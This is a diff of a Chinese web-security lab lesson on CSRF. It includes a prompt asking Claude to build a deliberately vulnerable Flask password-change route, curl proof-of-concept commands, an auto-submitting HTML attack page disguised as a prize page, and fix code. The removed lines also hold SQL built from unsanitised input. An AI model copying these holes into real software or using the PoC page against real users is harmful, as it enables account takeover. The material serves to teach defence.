@@ -1,296 +1,267 @@
 # Day 7 - CSRF 跨站请求伪造
 
-## 一、页面部署提示词
+---
 
-> 学生将此提示词发给 Claude，即可生成带 CSRF 漏洞的功能：
+## 一、发给 Claude 的提示词
+
+把以下内容完整复制粘贴到 claude.ai 对话框中：
 
 ```
-在 Flask 中实现用户密码修改功能，要求：
-1. 用户在个人中心可以修改自己的密码
-2. 表单提交新密码即可，不需要输入原密码验证
-3. 使用 Cookie/Session 识别用户身份
-4. 不要添加额外的验证码或 Token，简化用户体验
-5. 修改成功后直接跳转回个人中心
+请在上次已有的功能基础上，继续增加密码修改功能。保持原有功能不变。
+
+### 在 app.py 中新增以下内容：
+
+1. 新增路由 /change-password，支持 POST：
+   - 从表单接收 username 和 new_password 参数
+   - 直接更新用户数据中的密码字段，不需要验证原密码
+   - 不需要 CSRF Token 验证
+   - 不需要验证当前 session 用户和提交的 username 是否一致
+   - 修改成功后重定向到 /profile
+
+### 修改 templates/profile.html
+
+- 在个人中心页面添加"修改密码"表单
+- 包含：新密码输入框、确认密码输入框、修改按钮
+- 使用隐藏字段传递 username
+
+### 代码规范要求
+- 不要添加 CSRF Token
+- 不要验证原密码
+- 不要验证请求来源（Referer）
+- 只要 session 中有登录状态即可修改密码
+- 任何已登录用户都可以修改任何人的密码
+
+生成全部代码后告诉我，我复制覆盖到本地项目中。
 ```
 
 ---
 
-## 二、漏洞关键代码解释
+## 二、学生操作步骤
+
+| 步骤 | 操作 | 说明 |
+|------|------|------|
+| 1 | 复制上面提示词发给 Claude | 增加密码修改功能 |
+| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
+| 3 | 终端运行 `python app.py` | 启动项目 |
+| 4 | 用 curl 测试 CSRF 漏洞 | 见下方 POC |
+| 5 | 分析代码，编写修复到 fix/password_manager_fix.py | 修复漏洞 |
+| 6 | `git add -A && git commit -m "day-07: 密码修改 + CSRF修复"` | 提交成果 |
+
+---
+
+## 三、漏洞原理
 
 ### 漏洞：CSRF（跨站请求伪造）
 
 ```python
-# core/password_manager.py
-def change_password(username, new_password):
-    """
-    ============================================================
-    VULN: CSRF 漏洞
-    - 无 CSRF Token：请求中没有任何防跨站的 token 校验
-    - 仅依赖 Cookie 自动携带：浏览器在跨站请求时自动带 Cookie
-    - 无原密码验证：修改密码不需要确认旧密码
-    ============================================================
-    """
-    # 更新内存存储
-    from core.auth import USERS_DB
-    if username in USERS_DB:
-        USERS_DB[username]["password"] = new_password
-
-    # 更新 SQLite 数据库
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute(f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'")
-    conn.commit()
-    conn.close()
-    return {"success": True, "message": "密码修改成功"}
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    username = request.form.get('username')
+    new_password = request.form.get('new_password')
+    # 直接修改密码，无任何校验！
+    users[username]["password"] = new_password
+    return redirect('/profile')
 ```
 
-**问题**：
-1. **无 CSRF Token**：请求中没有随机 Token 来验证请求来源
-2. **无原密码验证**：不需要旧密码即可修改
-3. **Cookie 自动携带**：浏览器访问任何网站时都会自动带上目标站点的 Cookie
-4. **GET/POST 均可**：路由同时支持 GET 和 POST
+**三个缺失的防护**：
 
-**攻击流程**：
+| 防护措施 | 本代码 | 说明 |
+|---------|--------|------|
+| CSRF Token | ❌ 无 | 请求中没有唯一校验值 |
+| 原密码验证 | ❌ 无 | 直接修改，不需要旧密码 |
+| 身份校验 | ❌ 无 | 可修改任意用户的密码 |
+
+### 攻击流程
+
 ```
-1. 用户登录了 target.com → 浏览器有 target.com 的 Cookie
-2. 用户访问攻击者的恶意网站 attacker.com
-3. 恶意网站自动提交表单到 target.com/change-password
-4. 浏览器自动附带 Cookie → 服务器认为是用户本人操作
-5. 密码被修改 → 攻击者登录用户账号
+1. 用户 alice 登录了 target.com → 浏览器有 target.com 的 Cookie
+2. alice 收到一封钓鱼邮件，点开后访问 attacker.com
+3. attacker.com 页面中有一个隐藏表单：
+   <form action="http://target.com/change-password" method="POST">
+     <input name="username" value="admin">
+     <input name="new_password" value="hacked">
+   </form>
+   <script>document.forms[0].submit();</script>
+4. 浏览器自动附带 target.com 的 Cookie → 请求发送到 target.com
+5. 服务器看到有效 Cookie → 认为 alice 本人在操作 → 执行密码修改
+6. admin 的密码被改为 hacked → 攻击者登录 admin 账号
 ```
-
----
-
-## 三、漏洞成因总结
-
-| 漏洞 | 根本原因 | 攻击条件 |
-|------|---------|---------|
-| 无 CSRF Token | 请求无唯一校验值 | 用户已登录 + 访问恶意页面 |
-| 无原密码验证 | 直接修改密码 | 不需知道当前密码 |
-| Cookie 自动携带 | 浏览器同源策略不限制写请求 | 跨站表单提交即可 |
-| 单点验证 | 只验证了登录态，没验证操作意图 | 自动化脚本批量攻击 |
 
 ---
 
 ## 四、POC 代码
 
-### POC 1：直接修改密码（无 Token 验证）
+### POC 1：无Token修改密码
 
 ```bash
-# 以 bob 身份登录
-curl http://127.0.0.1:5000/login \
-  -d "username=bob&password=bob666666" \
-  -c /tmp/cookies_bob.txt
+# 用 alice 登录
+curl http://127.0.0.1:5000/login -d "username=alice&password=alice2025" -c /tmp/cookies.txt
 
-# 直接修改密码（不需要原密码、不需要 Token）
-curl http://127.0.0.1:5000/change-password \
-  -b /tmp/cookies_bob.txt \
-  -d "username=bob&new_password=hacked123"
+# 修改 admin 的密码（无需原密码、无需 Token）
+curl http://127.0.0.1:5000/change-password -b /tmp/cookies.txt -d "username=admin&new_password=hacked123"
 
-# 验证新密码可以登录
-curl http://127.0.0.1:5000/login \
-  -d "username=bob&password=hacked123" | grep "欢迎回来"
+# 用新密码登录 admin
+curl http://127.0.0.1:5000/login -d "username=admin&password=hacked123" | grep "欢迎回来"
 ```
 
-**预期结果**：无需原密码，仅凭 session cookie 即可修改密码。
+**预期结果**：alice 成功修改了 admin 的密码，说明 CSRF 漏洞存在。
 
-### POC 2：跨站请求构造（CSRF PoC 页面）
+### POC 2：构造 CSRF 恶意页面
 
-创建一个 HTML 页面，用户访问后自动修改密码：
+创建一个 HTML 文件 `csrf_poc.html`：
 
 ```html
 <!DOCTYPE html>
 <html>
 <head><title>每日抽奖</title></head>
 <body>
-  <h1>恭喜你中奖了！</h1>
-  <p>请稍候，正在为你准备奖品...</p>
-
-  <!-- 隐藏表单：自动提交密码修改请求 -->
-  <form action="http://127.0.0.1:5000/change-password"
-        method="POST" id="csrf_form">
+  <h1>恭喜中奖！正在为你准备奖品...</h1>
+  <form action="http://127.0.0.1:5000/change-password" method="POST" id="csrf">
     <input type="hidden" name="username" value="admin">
     <input type="hidden" name="new_password" value="csrfd_pwned">
   </form>
-
-  <script>
-    // 页面加载后自动提交
-    document.getElementById('csrf_form').submit();
-  </script>
+  <script>document.getElementById('csrf').submit();</script>
 </body>
 </html>
 ```
 
 **测试方法**：
-```bash
-# 保存为 csrf_poc.html
-# 管理员已登录 http://127.0.0.1:5000（浏览器有 Cookie）
-# 管理员打开 csrf_poc.html
-# → 密码被无声无息地修改为 csrfd_pwned
-# → 攻击者用新密码登录
-```
-
-### POC 3：使用 Burp Suite 生成 CSRF PoC
-
-1. 拦截正常密码修改请求
-2. 右键 → Engagement tools → Generate CSRF PoC
-3. Burp 自动生成 PoC HTML
-4. 保存到文件，在浏览器中打开测试
+1. 浏览器登录 target 网站（有 Cookie）
+2. 在同一个浏览器打开 `csrf_poc.html`
+3. 页面自动提交表单 → admin 密码被修改
+4. 攻击者用 `csrfd_pwned` 登录 admin
 
 ---
 
-## 五、POC 代码详细解释
+## 五、Burp Suite 测试方法
 
-### POC 1 详解
+1. 以 alice 身份登录
+2. 在个人中心页面提交修改密码表单
+3. 在 Burp 中拦截 POST /change-password 请求
+4. 观察请求中没有 CSRF Token 字段
+5. 修改 username=admin、new_password=test
+6. 放行请求
+7. 用 admin/test 登录验证
 
-```bash
-curl http://127.0.0.1:5000/change-password \
-  -b /tmp/cookies_bob.txt \
-  -d "username=bob&new_password=hacked123"
-```
+---
 
-**为什么不需要原密码？**
+## 六、POC 代码详细解释
+
+### 为什么不需要原密码？
+
 ```python
-# 代码中没有任何地方比较旧密码
-def change_password(username, new_password):
-    # 没有 old_password 参数！
-    # 没有验证 old_password 是否正确！
-    # 直接更新数据库
-    cursor.execute("UPDATE users SET password = ...")
+# 漏洞代码：没有 old_password 参数
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    username = request.form.get('username')
+    new_password = request.form.get('new_password')
+    # 没有比较 old_password！
+    # 直接就修改了！
+    users[username] = new_password
 ```
 
-**正常的安全流程应该是**：
-```
-1. 用户输入：旧密码 + 新密码
-2. 服务器验证旧密码是否正确
-3. 如果不正确 → 拒绝修改
-4. 如果正确 → 更新为新密码
-```
+### 为什么不需要 CSRF Token？
 
-### POC 2 详解：跨站请求
-
-```html
-<form action="http://127.0.0.1:5000/change-password" method="POST">
-  <input type="hidden" name="username" value="admin">
-  <input type="hidden" name="new_password" value="csrfd_pwned">
-</form>
-<script>document.getElementById('csrf_form').submit();</script>
+```python
+# 漏洞代码：没有校验 Token
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    # 没有检查 request.form.get('csrf_token')
+    # 没有比较 session 中的 token
+    # 直接就修改了！
 ```
 
-**攻击利用链条**：
+### 为什么 Cookie 会自动发送？
 
 ```
-用户 alice 的操作:
-1. 浏览器打开 target.com → 输入密码登录
-2. 浏览器获得 target.com 的 session Cookie
-3. 继续浏览其他网站...
+用户浏览器访问 attacker.com 时：
+  浏览器检查：表单提交目标域名是 target.com
+  浏览器检查：我有 target.com 的 Cookie 吗？有！
+  浏览器行为：自动附带 Cookie，无需任何用户操作
 
-攻击者的操作:
-1. 创建恶意网站，包含一个隐藏表单
-2. 诱导 alice 访问恶意网站（通过钓鱼邮件、广告等）
-3. alice 的浏览器加载恶意页面
-
-恶意页面的行为:
-1. <form action="http://target.com/change-password">
-2. 浏览器检查: target.com? 我有它的 Cookie!
-3. 浏览器自动附带 Cookie → 发送 POST 请求
-4. 服务器收到请求 + Cookie → 认为 alice 本人在操作
-5. 密码被修改 → 攻击者登录 alice 的账号
-```
-
-**为什么浏览器会发送 Cookie？**
-
-Cookie 的同源策略：浏览器发送 Cookie 时检查的是**目标域名**，不检查**当前页面域名**。
-
-```
-当前页面: attacker.com/evil.html
-表单提交到: target.com/change-password
-                ↑
-        浏览器: "目标域名是 target.com，我有它的 Cookie！附带发送！"
+这叫"同源策略的缺陷"：
+  同源策略限制的是"读取"（AJAX 读取跨站响应）
+  但不限制"写入"（表单提交）
 ```
 
 ---
 
-## 六、修复方案
+## 七、修复方案
+
+创建 `fix/password_manager_fix.py`：
 
 ```python
-# fix/password_manager_fix.py
 import secrets
-import hashlib
 import hmac
 
-# 方案 1：添加 CSRF Token
 class CSRFProtection:
     """CSRF Token 生成与验证"""
 
     @staticmethod
-    def generate_token(session_id):
-        """基于 session 生成唯一的 CSRF Token"""
-        random_part = secrets.token_hex(16)
-        return hashlib.sha256(f"{session_id}{random_part}".encode()).hexdigest()
+    def generate_token():
+        return secrets.token_hex(16)
 
     @staticmethod
-    def verify_token(token, session_id, stored_token):
-        """使用 hmac.compare_digest 安全比较 Token"""
+    def verify_token(token, stored_token):
         return hmac.compare_digest(token, stored_token)
 
 
-def change_password_fixed(username, old_password, new_password, csrf_token, session_csrf_token):
-    """修复：添加原密码验证 + CSRF Token 校验"""
+def change_password_fixed(username, old_password, new_password, csrf_token, session_token, current_user):
+    """修复：添加原密码验证 + CSRF Token 校验 + 身份校验"""
 
     # 修复 1：CSRF Token 校验
-    if not CSRFProtection.verify_token(csrf_token, username, session_csrf_token):
+    if not CSRFProtection.verify_token(csrf_token, session_token):
         return {"success": False, "message": "CSRF Token 无效"}
 
-    # 修复 2：验证原密码
-    from core.auth import USERS_DB
-    if username in USERS_DB and USERS_DB[username]["password"] != old_password:
+    # 修复 2：只能修改自己的密码
+    if current_user != username:
+        return {"success": False, "message": "不能修改他人的密码"}
+
+    # 修复 3：验证原密码
+    if users.get(username) != old_password:
         return {"success": False, "message": "原密码错误"}
 
-    # 修复 3：密码强度校验
+    # 修复 4：密码强度校验
     if len(new_password) < 8:
-        return {"success": False, "message": "密码长度至少8位"}
+        return {"success": False, "message": "密码至少8位"}
 
-    # 更新密码
-    USERS_DB[username]["password"] = new_password
+    users[username] = new_password
     return {"success": True, "message": "密码修改成功"}
 ```
 
-**其他防御措施**：
-```python
-# 修复 4：SameSite Cookie（设置浏览器不自动发送 Cookie）
-app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+**App.py 中的修复**：
 
-# 修复 5：Referer 校验
-def check_referer():
-    referer = request.headers.get('Referer', '')
-    if 'your-domain.com' not in referer:
-        return False
-    return True
+```python
+# 在 profile 路由中生成 Token 并传入模板
+session['csrf_token'] = CSRFProtection.generate_token()
+return render_template('profile.html', csrf_token=session['csrf_token'])
+
+# 在 change-password 路由中校验
+if not CSRFProtection.verify_token(
+    request.form.get('csrf_token'),
+    session.get('csrf_token')
+):
+    return "CSRF Token 无效"
 ```
 
 ---
 
-## 七、课后作业
+## 八、漏洞复现检查清单
 
-1. 在 `fix/` 目录创建 `password_manager_fix.py`，实现 CSRF Token 机制
-2. 修改 `app.py`：
-   - 在 `GET /profile` 时生成并传递 CSRF Token 到模板
-   - 在 `POST /change-password` 时校验 Token
-3. 验证：
-   - 无 Token 的请求被拒绝
-   - Token 错误被拒绝
-   - 正常页面提交可正常修改
-4. （进阶）尝试绕过 SameSite=Strict 的方法有哪些？
+| # | 检查项 | curl 命令 | 预期结果 |
+|---|--------|----------|---------|
+| 1 | 无Token改密 | `POST /change-password -d "username=admin&new_password=test"` | 密码被修改 |
+| 2 | 无原密码 | 同上，不需要 old_password | 直接成功 |
+| 3 | 越权改密 | alice 修改 admin 的密码 | 修改成功 |
+| 4 | 请求拦截 | Burp 检查请求参数 | 无 Token 字段 |
 
-## 八、补充：SameSite 详解
+---
 
-| SameSite 值 | 跨站表单提交 | 跨站链接点击 | 同站请求 |
-|-------------|------------|------------|---------|
-| `None` | ✅ 发送 Cookie | ✅ 发送 Cookie | ✅ 发送 Cookie |
-| `Lax`（默认） | ❌ 不发送 | ✅ 发送 | ✅ 发送 |
-| `Strict` | ❌ 不发送 | ❌ 不发送 | ✅ 发送 |
+## 九、课后任务
 
-**本漏洞未设置 SameSite，默认行为取决于浏览器**：
-- Chrome 90+ 默认 `Lax` → POST 表单跨站不发送 Cookie，**但 GET 请求可触发**
-- 如果路由同时接受 GET 请求，SameSite=Lax 可以被绕过
+1. 用 curl 直接修改其他用户的密码（无需原密码、无需 Token）
+2. 构造一个 CSRF PoC HTML 页面，在浏览器中测试
+3. 在 fix/ 目录下编写修复代码
+4. 验证修复后 CSRF 攻击被拦截
+5. （进阶）研究 SameSite Cookie 属性的作用
+6. 提交到自己的个人分支
